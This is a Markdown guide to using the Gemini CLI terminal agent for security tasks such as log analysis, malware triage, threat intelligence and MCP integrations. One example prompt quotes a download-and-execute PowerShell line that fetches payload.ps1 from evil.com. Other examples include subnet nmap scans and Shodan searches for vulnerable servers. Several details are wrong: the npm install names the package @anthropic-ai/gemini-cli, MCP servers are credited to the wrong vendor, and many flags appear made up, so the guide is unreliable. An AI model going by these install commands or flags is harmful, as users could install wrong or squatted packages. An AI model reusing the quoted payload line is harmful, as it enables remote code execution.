# Gemini CLI Guide

Build, debug, and automate security workflows with Google's open-source AI agent in your terminal.

---

## Table of Contents

1. [Overview](#overview)
2. [Installation](#installation)
3. [Configuration](#configuration)
4. [Basic Usage](#basic-usage)
5. [Security Workflows](#security-workflows)
6. [MCP Integration](#mcp-integration)
7. [Advanced Features](#advanced-features)
8. [Comparison with Other CLI Tools](#comparison-with-other-cli-tools)

---

## Overview

**Gemini CLI** is Google's open-source command-line AI agent that brings Gemini directly to your terminal. Released in June 2025, it uses a ReAct (reason and act) loop with built-in tools and MCP server support.

### Key Features

| Feature | Description |
|---------|-------------|
| **Gemini 3 Pro/Flash** | Access to Google's most intelligent models |
| **1M Token Context** | Massive context window for large codebases |
| **Built-in Tools** | Google Search, file ops, shell commands, web fetch |
| **MCP Support** | Extend with Model Context Protocol servers |
| **Open Source** | Apache 2.0 license, fully customizable |
| **Free Tier** | 60 requests/min, 1000 requests/day at no cost |

### Why Gemini CLI for Security?

1. **Large Context**: Analyze entire log files, memory dumps, or codebases
2. **Google Search Grounding**: Real-time threat intelligence lookups
3. **Shell Integration**: Execute security tools directly from AI prompts
4. **MCP Extensibility**: Connect to VirusTotal, MISP, Shodan via MCP servers
5. **Free Access**: Generous free tier for learning and development

---

## Installation

### Prerequisites

- Node.js 18+ (for npm install) or direct binary
- Google account (for free tier authentication)

### Option 1: npm (Recommended)

```bash
# Install globally
npm install -g @anthropic-ai/gemini-cli

# Or use npx without installing
npx @anthropic-ai/gemini-cli
```

### Option 2: Direct Download

```bash
# Linux/macOS
curl -fsSL https://raw.githubusercontent.com/google-gemini/gemini-cli/main/install.sh | bash

# Windows (PowerShell)
irm https://raw.githubusercontent.com/google-gemini/gemini-cli/main/install.ps1 | iex
```

### Option 3: Build from Source

```bash
git clone https://github.com/google-gemini/gemini-cli.git
cd gemini-cli
npm install
npm run build
npm link
```

### Verify Installation

```bash
gemini --version
gemini --help
```

---

## Configuration

### Authentication

**Option 1: Google Account (Free Tier)**

```bash
# Login with Google account
gemini auth login

# This provides:
# - Gemini 2.5 Pro with 1M context
# - 60 requests/minute
# - 1,000 requests/day
```

**Option 2: API Key**

```bash
# Set API key
export GOOGLE_API_KEY="your-api-key"

# Or in .env file
echo "GOOGLE_API_KEY=your-api-key" >> ~/.gemini/.env
```

**Option 3: Vertex AI (Enterprise)**

```bash
# For Google Cloud integration
export GOOGLE_CLOUD_PROJECT="your-project-id"
gcloud auth application-default login
```

### Configuration File

Create `~/.gemini/config.json`:

```json
{
  "model": "gemini-3-flash",
  "temperature": 0.7,
  "maxTokens": 8192,
  "tools": {
    "googleSearch": true,
    "codeExecution": true,
    "fileOperations": true
  },
  "safety": {
    "blockDangerous": true
  }
}
```

### Model Selection

```bash
# Use Gemini 3 Pro (most capable)
gemini --model gemini-3-pro "Analyze this malware sample"

# Use Gemini 3 Flash (faster, good for high-frequency tasks)
gemini --model gemini-3-flash "Parse these logs"

# Use Gemini 2.5 Pro (1M context, free tier default)
gemini --model gemini-2.5-pro "Analyze this large codebase"
```

---

## Basic Usage

### Interactive Mode

```bash
# Start interactive session
gemini

# With specific context
gemini --context ./project/

# With system instruction
gemini --system "You are a security analyst specializing in malware analysis"
```

### One-Shot Commands

```bash
# Quick analysis
gemini "What MITRE ATT&CK techniques does this PowerShell command use: IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"

# File analysis
gemini "Analyze this log file for suspicious activity" < /var/log/auth.log

# Pipe input
cat suspicious.ps1 | gemini "Deobfuscate this script and identify malicious behavior"
```

### Working with Files

```bash
# Analyze specific file
gemini --file malware_sample.exe "What does this binary do?"

# Multiple files
gemini --file logs/*.json "Correlate these events and identify the attack chain"

# Directory context
gemini --context ./incident_data/ "Create a timeline of this incident"
```

---

## Security Workflows

### Log Analysis

```bash
# Analyze auth logs
gemini "Analyze for brute force attacks and lateral movement" < /var/log/auth.log

# Parse Windows Event Logs
gemini --file security.evtx "Extract failed login attempts and identify patterns"

# Correlate multiple sources
gemini --context ./logs/ "Correlate firewall, auth, and application logs to identify the attack path"
```

### Malware Analysis

```bash
# Static analysis
gemini --file suspicious.ps1 "Perform static analysis: identify obfuscation, C2 communication, and persistence mechanisms"

# PE file analysis
gemini "Analyze these PE headers and identify suspicious characteristics" < pe_dump.txt

# YARA rule generation
gemini "Generate YARA rules for this malware family based on these samples" --context ./samples/
```

### Threat Intelligence

```bash
# IOC extraction
gemini "Extract all IOCs (IPs, domains, hashes, emails) from this threat report" < report.pdf

# Attribution analysis
cat ttp_data.json | gemini "Map these behaviors to MITRE ATT&CK and suggest threat actor attribution"

# Threat hunting queries
gemini "Generate Splunk/Elastic queries to hunt for this technique: T1059.001"
```

### Incident Response

```bash
# Triage assistance
gemini --context ./incident/ "Triage this incident: identify scope, impact, and recommend containment actions"

# Timeline creation
gemini --file artifacts/*.json "Create a forensic timeline of this compromise"

# Playbook execution
gemini "Guide me through ransomware response for a Windows domain environment"
```

### Vulnerability Analysis

```bash
# CVE analysis
gemini "Explain CVE-2024-XXXX, provide exploitation details, and recommend mitigations"

# Code review
gemini --file app.py "Identify security vulnerabilities in this code (OWASP Top 10)"

# Scan result analysis
gemini --file nessus_export.csv "Prioritize these vulnerabilities by risk and recommend remediation order"
```

---

## MCP Integration

Gemini CLI supports Model Context Protocol (MCP) servers for extended capabilities.

### Configure MCP Servers

Create `~/.gemini/mcp.json`:

```json
{
  "servers": {
    "virustotal": {
      "command": "npx",
      "args": ["-y", "@anthropic-ai/mcp-virustotal"],
      "env": {
        "VT_API_KEY": "${VIRUSTOTAL_API_KEY}"
      }
    },
    "shodan": {
      "command": "python",
      "args": ["-m", "mcp_shodan"],
      "env": {
        "SHODAN_API_KEY": "${SHODAN_API_KEY}"
      }
    },
    "filesystem": {
      "command": "npx",
      "args": ["-y", "@anthropic-ai/mcp-filesystem", "/home/user/security-data"]
    }
  }
}
```

### Using MCP Tools

```bash
# VirusTotal lookups
gemini "Check this hash on VirusTotal: 44d88612fea8a8f36de82e1278abb02f"

# Shodan queries
gemini "Find internet-facing systems running vulnerable Apache versions"

# Combined analysis
gemini "Investigate this IP: check reputation, scan for services, and identify associated malware"
```

### Security-Focused MCP Servers

| Server | Purpose | Install |
|--------|---------|---------|
| `mcp-virustotal` | Hash/URL/IP reputation | `npm i @anthropic-ai/mcp-virustotal` |
| `mcp-shodan` | Internet scanning | `pip install mcp-shodan` |
| `mcp-misp` | Threat intel platform | `pip install mcp-misp` |
| `mcp-filesystem` | Local file access | Built-in |
| `mcp-sqlite` | Database queries | `npm i @anthropic-ai/mcp-sqlite` |

---

## Advanced Features

### Shell Command Execution

```bash
# Enable shell execution (use with caution)
gemini --allow-shell "Run nmap on 192.168.1.0/24 and summarize findings"

# Safer: review commands first
gemini --shell-confirm "Set up a YARA scan on the malware directory"
```

### Google Search Grounding

```bash
# Enable real-time search
gemini --search "What are the latest IOCs for LockBit ransomware?"

# Threat intelligence research
gemini --search "Recent vulnerabilities in Cisco ASA with active exploitation"
```

### Code Execution

```bash
# Run Python for analysis
gemini --code-exec "Calculate the entropy of each section in this PE file" --file sample.exe

# Data processing
gemini --code-exec "Parse these logs and create a frequency analysis of source IPs" --file access.log
```

### Session Management

```bash
# Save session for later
gemini --session incident-2024-001 "Begin investigating the phishing incident"

# Resume session
gemini --resume incident-2024-001 "What did we find about the sender domain?"

# Export session
gemini --export incident-2024-001 > incident_notes.md
```

### Output Formats

```bash
# JSON output for automation
gemini --output json "Extract IOCs from this report" < report.txt

# Markdown for documentation
gemini --output markdown "Create an incident report" > report.md

# Structured data
gemini --schema '{"iocs": ["string"], "ttps": ["string"]}' "Extract threat data" < intel.txt
```

---

## Comparison with Other CLI Tools

| Feature | Gemini CLI | Claude Code | GitHub Copilot CLI |
|---------|------------|-------------|-------------------|
| **Free Tier** | 1000/day | Limited | Subscription |
| **Context Window** | 1M tokens | 200K tokens | Limited |
| **MCP Support** | Yes | Yes | No |
| **Shell Integration** | Yes | Yes | Yes |
| **Google Search** | Native | Via MCP | No |
| **Open Source** | Yes (Apache 2.0) | No | No |
| **Best For** | Large context, research | Coding, git ops | Code completion |

### When to Use Gemini CLI

- **Large file analysis**: Memory dumps, full codebases, extensive logs
- **Research tasks**: Threat intel with Google Search grounding
- **Cost-sensitive**: Generous free tier
- **Google ecosystem**: Vertex AI, Cloud integration

### When to Use Claude Code

- **Git workflows**: Commits, PRs, code review
- **Coding tasks**: Refactoring, debugging
- **MCP ecosystem**: More mature MCP server library

---

## Tips & Best Practices

### Security Considerations

```bash
# Don't expose sensitive data in prompts
# BAD: gemini "Analyze password: MySecretPass123"
# GOOD: gemini --file sanitized_logs.txt "Analyze authentication failures"

# Use environment variables for API keys
export VIRUSTOTAL_API_KEY="your-key"  # Not in command history

# Review shell commands before execution
gemini --shell-confirm "Run security scan"
```

### Performance Optimization

```bash
# Use Flash model for quick tasks
gemini --model gemini-3-flash "Quick IOC check"

# Use Pro model for complex analysis
gemini --model gemini-3-pro "Deep malware analysis"

# Chunk large files
split -b 500K large_log.txt chunk_
for f in chunk_*; do gemini "Analyze: " < $f >> results.txt; done
```

### Integration Examples

```bash
# Cron job for daily threat intel
0 8 * * * gemini --search --output json "Latest CVEs for our tech stack" > /var/reports/daily_cves.json

# Git hook for security review
# .git/hooks/pre-commit
gemini --file $(git diff --cached --name-only) "Security review these changes"

# Pipeline integration
cat alerts.json | gemini "Triage and prioritize" | jq '.priority == "high"'
```

---

## Quick Reference

### Basic Commands

```bash
gemini                              # Interactive mode
gemini "Your question"              # One-shot query
gemini --file log.txt "Analyze"     # With file input
cat data.json | gemini "Parse"      # Pipe input
gemini --context ./project/ "Explain"  # Directory context
```

### Model Selection

```bash
gemini --model gemini-3-pro "Complex analysis"    # Most capable
gemini --model gemini-3-flash "Quick task"        # Faster
gemini --model gemini-2.5-pro "Large file"        # 1M context
```

### Security Workflows

```bash
gemini "Find brute force attacks" < /var/log/auth.log
gemini --file suspicious.ps1 "Analyze for malicious behavior"
gemini "Extract IOCs from this report" < threat_report.pdf
gemini --search "Latest IOCs for LockBit ransomware"
```

### Free Tier Limits

| Resource | Limit |
|----------|-------|
| Requests/minute | 60 |
| Requests/day | 1,000 |
| Context window | 1M tokens |

---

## Resources

- [GitHub Repository](https://github.com/google-gemini/gemini-cli)
- [Official Documentation](https://ai.google.dev/gemini-api/docs)
- [Google AI Studio](https://aistudio.google.com/) - Web interface for Gemini
- [MCP Specification](https://modelcontextprotocol.io/)

---

**Next**: [Google ADK Guide](./google-adk-guide.md) | [Claude Code Guide](./claude-code-cli-guide.md) | [AI Tools Comparison](./ai-dev-tools-comparison.md)
